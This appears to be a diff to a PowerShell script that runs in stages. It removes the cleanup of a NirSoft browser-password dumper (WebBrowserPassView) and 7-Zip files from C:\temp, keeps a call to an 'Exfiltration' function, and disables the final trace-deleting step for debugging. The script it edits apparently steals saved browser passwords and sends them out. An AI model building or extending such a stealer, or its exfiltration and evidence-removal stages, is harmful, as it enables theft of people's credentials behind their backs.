@@ -43,14 +43,6 @@ function TempDir {
     # Change the directory to C:\temp
     Set-Location -Path "C:\temp"
 
-    # Removing files from Get-Nirsoft function from stage1 ( if they do not exist, can't remove them )
-    Remove-Item "C:\temp\7z.zip" -Force
-    Remove-Item "C:\temp\7z" -Force -Recurse
-    Remove-Item "C:\temp\readme.txt" -Force
-    Remove-Item "C:\temp\wbpv.zip" -Force
-    Remove-Item "C:\temp\WebBrowserPassView.cfg" -Force
-    Remove-Item "C:\temp\WebBrowserPassView.chm" -Force
-    Remove-Item "C:\temp\WebBrowserPassView.exe" -Force
 }
 
 
@@ -525,4 +517,5 @@ TempDir
 Exfiltration
 
 # Call DelTempDir
-DelTempDir
+#DelTempDir
+pause
